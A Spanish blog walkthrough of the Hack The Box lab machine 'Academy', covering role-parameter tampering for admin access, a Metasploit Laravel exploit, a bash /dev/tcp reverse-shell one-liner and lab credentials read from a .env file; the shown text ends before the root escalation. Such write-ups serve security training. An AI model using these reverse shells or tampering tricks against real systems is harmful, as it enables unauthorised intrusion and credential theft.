---
layout: single
title: Academy - Hack The Box
excerpt: "Resolución de la máquina *Academy* de Hack The Box, una máquina Linux de dificultad fácil según la plataforma en la cual nos aprovechamos del parámetro rolid para crear un usuario administrador en la web, luego utilizamos un exploit para el framework *laravel* para acceder al sistema y por último aprovechamos que podemos ejecutar el comando *composer* con sudo sin contraseña para escalar privilegios y obtener una shell de root."
date: 2021-03-07
classes: wide
header:
  teaser: /assets/images/Academy-Hackthebox/academy.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - Web Exploiting
  - Privilege Escalation
  - Pentesting
  - Linux
---

![](/assets/images/Academy-Hackthebox/academy.png)

Resolución de la máquina *Academy* de Hack The Box, una máquina Linux de dificultad fácil según la plataforma en la cual nos aprovechamos del parámetro rolid para crear un usuario administrador en la web, luego utilizamos un exploit para el framework *laravel* para acceder al sistema y por último aprovechamos que podemos ejecutar el comando *composer* con sudo sin contraseña para escalar privilegios y obtener una shell de root.

## Escaneo de puertos

![](/assets/images/Academy-Hackthebox/nmap.png)

Puertos 22,80 y 33060 abiertos.
Empiezo por el 80. Accedo con el navegador a la ip 10.10.10.215 y me dice que no se puede abrir la página.
Veo que en el escaneo con nmap aparece el dominio academy.htb, lo añado al fichero hosts y ya me deja acceder con el nombre del dominio.

![](/assets/images/Academy-Hackthebox/web.png)

Lanzo gobuster para fuzzear los directorios y ficheros de la web.

![](/assets/images/Academy-Hackthebox/gobuster.png)

Mientras tanto me registro en la página y capturo la petición con burpsuite.
Veo que los parámetros que viajan en la petición son:
uid=ximo&password=ximo&confirm=ximo&roleid=0
Me llamala atención el parámetro roleid. Envío la petición al repeater y modifico el valor a 1.
Gobuster descubre una página que se llama admin.php, así que pruebo el usuario que he registrado con el roleid=1 y accedo como admin.

![](/assets/images/Academy-Hackthebox/admin.png)

Gobuster encuentra también un fichero readme dentro del directorio academy, que dice que se está usando un framework llamado laravel.

Me llama la atención esto : Fix issue with dev-staging-01.academy.htb
Lo añado al fichero hosts y accedo a la página.

![](/assets/images/Academy-Hackthebox/dev.png)

Sabiendo que el frameowrk usado es laravel empiezo a buscar vulnerabilidades relacionadas con este framework.
Encuentro un exploit para metasploit y decido usarlo.
Seteo el app_key, que me lo da la web del subdominio en la sección de environment, el rhosts academy.htb, lhost tun0 y vhost dev-staging-01.academy.htb y obtengo una shell.

![](/assets/images/Academy-Hackthebox/msf.png)

Me pongo a la escucha con rlwrap nc -lvnp 9001 y me lanzo una reverse shell para estar más cómodo
`bash -c 'bash -i >& /dev/tcp/10.10.14.191/9001 0>&1'`

Voy al directorio academy y con ls -a veo que hay un fichero .env que puedo leer y que contiene unas credenciales.

![](/assets/images/Academy-Hackthebox/creds.png)

En el directorio home hay varios usuarios, pruebo la contraseña con todos y hay uno que funciona.

```
su cry0l1t3
Password: mySup3rP4s5w0rd!!
```

Subo a la máquina el script linpeas.sh y lo ejecuto y encuentro la contraseña del usuario mrb3n –> mrb3n_Ac@d3my!

![](/assets/images/Academy-Hackthebox/linpeas.png)




